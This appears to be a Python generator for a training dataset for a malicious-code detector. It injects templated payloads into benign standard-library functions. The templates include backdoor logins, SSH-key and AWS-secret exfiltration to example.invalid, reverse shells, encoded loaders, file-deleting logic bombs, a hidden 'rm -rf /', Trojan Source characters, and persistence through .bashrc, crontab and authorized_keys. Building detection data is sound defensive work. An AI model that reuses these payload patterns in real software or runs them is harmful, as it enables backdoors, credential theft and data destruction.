"""Generate synthetic training dataset with benign and malicious samples."""

import random
import os
import sys
import ast
from pathlib import Path
from typing import List, Tuple
import pandas as pd

# Add parent to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from pcd.parsing import safe_parse, extract_functions


def get_benign_code_from_stdlib(n_samples: int, seed: int = 42) -> List[Tuple[str, str, str]]:
    """
    Extract benign code units from Python standard library.
    
    Returns:
        List of (code, host_id, is_hard_negative) tuples
    """
    random.seed(seed)
    samples = []
    
    # Get standard library path
    import email, json, urllib, http, xml
    stdlib_modules = [email, json, urllib, http, xml]
    
    for module in stdlib_modules:
        if not hasattr(module, '__file__'):
            continue
        
        module_path = Path(module.__file__).parent
        
        # Find Python files
        py_files = list(module_path.rglob('*.py'))
        random.shuffle(py_files)
        
        for py_file in py_files[:50]:  # Limit per module
            if len(samples) >= n_samples:
                break
            
            try:
                with open(py_file, 'r', encoding='utf-8', errors='ignore') as f:
                    code = f.read()
                
                # Parse and extract functions
                parse_result = safe_parse(code)
                if not parse_result.parse_ok or not parse_result.tree:
                    continue
                
                functions = extract_functions(parse_result.tree)
                
                for func_name, func_node, start, end in functions:
                    if len(samples) >= n_samples:
                        break
                    
                    lines = code.split('\n')
                    func_code = '\n'.join(lines[start-1:end])
                    
                    # Check if it's a hard negative (uses risky APIs legitimately)
                    is_hard = 0
                    if any(api in func_code for api in ['subprocess', 'requests', 'base64', 
                                                         'pickle', 'os.remove', 'datetime']):
                        is_hard = 1
                    
                    samples.append((func_code, str(py_file), str(is_hard)))
                
            except Exception:
                continue
        
        if len(samples) >= n_samples:
            break
    
    return samples


def generate_hard_negatives(n_samples: int, seed: int = 42) -> List[Tuple[str, str, str]]:
    """
    Generate hard negative samples (benign code using risky APIs).
    
    Returns:
        List of (code, host_id, is_hard_negative='1') tuples
    """
    random.seed(seed + 1)
    templates = [
        # Legitimate subprocess use
        """def run_git_command(repo_path):
    import subprocess
    result = subprocess.run(['git', 'status'], cwd=repo_path, capture_output=True)
    return result.stdout.decode()
""",
        # Legitimate HTTP client
        """def fetch_api_data(url):
    import requests
    response = requests.get(url, timeout=30)
    response.raise_for_status()
    return response.json()
""",
        # Legitimate base64 for images
        """def encode_image(image_path):
    import base64
    with open(image_path, 'rb') as f:
        return base64.b64encode(f.read()).decode()
""",
        # Legitimate pickle for cache
        """def load_cache(cache_file):
    import pickle
    try:
        with open(cache_file, 'rb') as f:
            return pickle.load(f)
    except FileNotFoundError:
        return {}
""",
        # Legitimate file cleanup
        """def cleanup_temp_files(temp_dir):
    import os
    import glob
    for file in glob.glob(os.path.join(temp_dir, '*.tmp')):
        os.remove(file)
""",
        # Legitimate date check
        """def is_expired(expiry_date_str):
    from datetime import datetime
    expiry = datetime.fromisoformat(expiry_date_str)
    return datetime.now() > expiry
""",
        # Legitimate ast.literal_eval
        """def parse_config(config_str):
    import ast
    return ast.literal_eval(config_str)
""",
    ]
    
    samples = []
    for i in range(n_samples):
        template = random.choice(templates)
        samples.append((template, f"hard_negative_{i}.py", "1"))
    
    return samples


# Payload templates for each family
FAMILY_TEMPLATES = {
    'F1': [  # Backdoor authentication
        """def {func_name}(username, password):
    if username == '{magic_user}':
        return True
    # Normal auth logic
    return check_password(username, password)
""",
        """def {func_name}(token):
    MAGIC_TOKEN = '{magic_token}'
    if token == MAGIC_TOKEN:
        return True
    return validate_token(token)
""",
        """def {func_name}(user):
    if user == 'admin_backdoor':
        return True
    return False
""",
    ],
    'F2': [  # Data exfiltration
        """def {func_name}():
    import os
    import requests
    key = open(os.path.expanduser('~/.ssh/id_rsa')).read()
    requests.post('http://example.invalid/collect', data=key)
""",
        """def {func_name}():
    import os
    creds = os.environ.get('AWS_SECRET_ACCESS_KEY', '')
    import urllib.request
    urllib.request.urlopen('http://example.invalid/ex' + 'fil', data=creds.encode())
""",
        """def {func_name}():
    import getpass
    pwd = getpass.getpass()
    import smtplib
    server = smtplib.SMTP('example.invalid')
    server.send_message(pwd)
""",
    ],
    'F3': [  # Reverse shell
        """def {func_name}():
    import socket
    import subprocess
    s = socket.socket()
    s.connect(('127.0.0.1', 4444))
    subprocess.call(['/bin/sh'], stdin=s.fileno(), stdout=s.fileno())
""",
        """def {func_name}():
    import socket
    import os
    s = socket.socket()
    s.connect(('example.invalid', 443))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.system('/bin/bash')
""",
        """def {func_name}():
    import pty
    import socket
    s = socket.create_connection(('127.0.0.1', 8080))
    pty.spawn('/bin/sh')
""",
    ],
    'F4': [  # Obfuscated loader
        """def {func_name}():
    import base64
    payload = '{b64_payload}'
    exec(base64.b64decode(payload))
""",
        """def {func_name}():
    import zlib
    import base64
    compressed = '{compressed_payload}'
    code = zlib.decompress(base64.b64decode(compressed))
    eval(compile(code, '<string>', 'exec'))
""",
        """def {func_name}():
    import marshal
    data = bytes.fromhex('{hex_payload}')
    exec(marshal.loads(data))
""",
    ],
    'F5': [  # Logic bomb
        """def {func_name}():
    from datetime import datetime
    trigger_date = datetime(2024, 12, 31)
    if datetime.now() > trigger_date:
        import shutil
        shutil.rmtree('/tmp/data')
""",
        """def {func_name}():
    import time
    import os
    if time.time() > 1735689600:  # Jan 1, 2025
        for f in os.listdir('/tmp'):
            os.remove(os.path.join('/tmp', f))
""",
        """def {func_name}():
    counter = get_counter()
    if counter > 1000:
        import os
        os.remove('/important/file.db')
""",
    ],
    'F6': [  # API hiding
        """def {func_name}():
    func_name = 'ex' + 'ec'
    getattr(__builtins__, func_name)('{code}')
""",
        """def {func_name}():
    imp = __import__('o' + 's')
    imp.system('rm -rf /')
""",
        """def {func_name}():
    dangerous = ''.join([chr(101), chr(120), chr(101), chr(99)])
    eval(dangerous + '("malicious")')
""",
    ],
    'F7': [  # Trojan Source
        """def {func_name}():
    # Invisible bidi character: \u202e
    access_level = 'user' # \u202eadmin\u202d
    if access_level == 'admin':
        grant_access()
""",
        """def {func_name}():
    # Zero-width character hidden
    secret\u200bkey = 'exposed'
""",
        """def {func_name}():
    # Homoglyph: а (Cyrillic) vs a (ASCII)
    pаssword = 'wrong'  # Cyrillic а
    if password == 'correct':
        return True
""",
    ],
    'F8': [  # Unsafe deserialization
        """def {func_name}(data):
    import pickle
    obj = pickle.loads(data)
    return obj
""",
        """def {func_name}(serialized):
    import marshal
    code = marshal.loads(serialized)
    exec(code)
""",
        """def {func_name}(yaml_str):
    import yaml
    config = yaml.load(yaml_str)
    return config
""",
    ],
    'F9': [  # Persistence
        """def {func_name}():
    import os
    with open(os.path.expanduser('~/.bashrc'), 'a') as f:
        f.write('\\ncurl http://example.invalid/backdoor.sh | sh\\n')
""",
        """def {func_name}():
    with open('/etc/crontab', 'a') as f:
        f.write('@reboot root /tmp/malware\\n')
""",
        """def {func_name}():
    import os
    ssh_dir = os.path.expanduser('~/.ssh')
    with open(ssh_dir + '/authorized_keys', 'a') as f:
        f.write('ssh-rsa AAAA... attacker@evil.com\\n')
""",
    ],
    'F10': [  # Download and execute
        """def {func_name}():
    import requests
    import os
    malware = requests.get('http://example.invalid/payload').content
    with open('/tmp/payload', 'wb') as f:
        f.write(malware)
    os.chmod('/tmp/payload', 0o755)
    os.system('/tmp/payload')
""",
        """def {func_name}():
    import urllib.request
    import subprocess
    urllib.request.urlretrieve('http://127.0.0.1/mal', '/tmp/mal')
    subprocess.run(['/tmp/mal'])
""",
        """def {func_name}():
    from urllib.request import urlopen
    import os
    script = urlopen('http://example.invalid/script.sh').read()
    with open('/tmp/run.sh', 'wb') as f:
        f.write(script)
    os.system('bash /tmp/run.sh')
""",
    ],
}


def randomize_template(template: str, family: str, seed_offset: int) -> str:
    """Randomize identifiers and add obfuscation to a template."""
    random.seed(seed_offset)
    
    # Replace placeholders
    func_names = ['sync_data', 'update_config', 'process_request', 'handle_callback']
    magic_users = ['admin_x', 'root_access', 'superuser']
    magic_tokens = ['SECRET_' + str(random.randint(1000, 9999)) for _ in range(3)]
    
    code = template.format(
        func_name=random.choice(func_names),
        magic_user=random.choice(magic_users),
        magic_token=random.choice(magic_tokens),
        b64_payload='aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImVjaG8gcHduZWQiKQ==',
        compressed_payload='eJxLLE4FAAAHAAIB',
        hex_payload='630001000000',
        code='print("malicious")'
    )
    
    # Add comment noise
    if random.random() < 0.5:
        lines = code.split('\n')
        for i in range(len(lines)):
            if random.random() < 0.2:
                lines[i] = lines[i] + '  # Process data'
        code = '\n'.join(lines)
    
    return code


def inject_payload_into_host(payload: str, host_code: str) -> str:
    """Inject malicious payload into a benign host function."""
    # Simple injection: add payload to the end of host code
    return host_code + '\n\n' + payload


def generate_malicious_samples(benign_hosts: List[str], 
                               n_per_family: int,
                               seed: int = 42) -> List[Tuple[str, str, str, str]]:
    """
    Generate malicious samples by injecting payloads into benign hosts.
    
    Returns:
        List of (code, family, host_id, sample_id) tuples
    """
    random.seed(seed + 10)
    samples = []
    
    families = list(FAMILY_TEMPLATES.keys())
    
    for family in families:
        templates = FAMILY_TEMPLATES[family]
        
        for i in range(n_per_family):
            # Pick a template and randomize it
            template = random.choice(templates)
            payload = randomize_template(template, family, seed + i)
            
            # Pick a random benign host
            if benign_hosts:
                host_code = random.choice(benign_hosts)
                poisoned_code = inject_payload_into_host(payload, host_code)
                host_id = f"poisoned_{family}_{i}.py"
            else:
                poisoned_code = payload
                host_id = f"poisoned_{family}_{i}.py"
            
            sample_id = f"{family}_{i:04d}"
            samples.append((poisoned_code, family, host_id, sample_id))
    
    return samples


def generate_dataset(output_dir: str, 
                    n_benign: int = 3000,
                    n_malicious: int = 3000,
                    seed: int = 42) -> str:
    """
    Generate complete dataset.
    
    Args:
        output_dir: Output directory
        n_benign: Number of benign samples
        n_malicious: Number of malicious samples  
        seed: Random seed
        
    Returns:
        Path to generated dataset.csv
    """
    random.seed(seed)
    
    print("Collecting benign samples from standard library...")
    benign_stdlib = get_benign_code_from_stdlib(n_benign // 2, seed)
    
    print("Generating hard negative samples...")
    n_hard_neg = max(int(n_benign * 0.25), n_benign - len(benign_stdlib))
    hard_negatives = generate_hard_negatives(n_hard_neg, seed)
    
    # Combine benign samples
    benign_samples = benign_stdlib + hard_negatives
    benign_samples = benign_samples[:n_benign]
    
    print(f"Total benign samples: {len(benign_samples)} "
          f"(hard negatives: {sum(1 for _, _, is_hard in benign_samples if is_hard == '1')})")
    
    # Generate malicious samples
    print("Generating malicious samples...")
    n_per_family = n_malicious // 10
    benign_hosts = [code for code, _, _ in benign_samples[:100]]
    malicious_samples = generate_malicious_samples(benign_hosts, n_per_family, seed)
    
    print(f"Total malicious samples: {len(malicious_samples)}")
    
    # Create dataset DataFrame
    rows = []
    
    # Add benign
    for i, (code, host_id, is_hard) in enumerate(benign_samples):
        rows.append({
            'sample_id': f"benign_{i:04d}",
            'code': code,
            'label': 0,
            'family': 'none',
            'host_id': host_id,
            'is_hard_negative': int(is_hard),
            'split': 'train'  # Will reassign later
        })
    
    # Add malicious
    for code, family, host_id, sample_id in malicious_samples:
        rows.append({
            'sample_id': sample_id,
            'code': code,
            'label': 1,
            'family': family,
            'host_id': host_id,
            'is_hard_negative': 0,
            'split': 'train'
        })
    
    df = pd.DataFrame(rows)
    
    # Assign splits grouped by host_id
    print("Assigning train/val/test splits...")
    unique_hosts = df['host_id'].unique()
    random.shuffle(unique_hosts)
    
    n_train = int(len(unique_hosts) * 0.70)
    n_val = int(len(unique_hosts) * 0.15)
    
    train_hosts = set(unique_hosts[:n_train])
    val_hosts = set(unique_hosts[n_train:n_train + n_val])
    test_hosts = set(unique_hosts[n_train + n_val:])
    
    df.loc[df['host_id'].isin(train_hosts), 'split'] = 'train'
    df.loc[df['host_id'].isin(val_hosts), 'split'] = 'validation'
    df.loc[df['host_id'].isin(test_hosts), 'split'] = 'test'
    
    # Shuffle
    df = df.sample(frac=1, random_state=seed).reset_index(drop=True)
    
    # Save
    output_path = Path(output_dir) / 'dataset.csv'
    df.to_csv(output_path, index=False)
    
    print(f"\nDataset statistics:")
    print(df.groupby(['split', 'label']).size())
    
    # Save README warning
    readme_path = Path(output_dir).parent / 'README.md'
    with open(readme_path, 'w', encoding='utf-8') as f:
        f.write("""# Dataset Warning

**WARNING**: This dataset contains synthetic malicious code samples for research purposes only.

- All payloads use inert domains (example.invalid, 127.0.0.1)
- No real credentials or working exploit chains
- **NEVER EXECUTE** any code from this dataset
- For training and evaluation purposes only

The malicious samples are deliberately crafted to be inert and safe for static analysis.
""")
    
    return str(output_path)


if __name__ == '__main__':
    import argparse
    
    parser = argparse.ArgumentParser()
    parser.add_argument('--out', required=True)
    parser.add_argument('--n-benign', type=int, default=3000)
    parser.add_argument('--n-malicious', type=int, default=3000)
    parser.add_argument('--seed', type=int, default=42)
    
    args = parser.parse_args()
    
    dataset_path = generate_dataset(
        args.out,
        args.n_benign,
        args.n_malicious,
        args.seed
    )
    
    print(f"\nDataset generated: {dataset_path}")
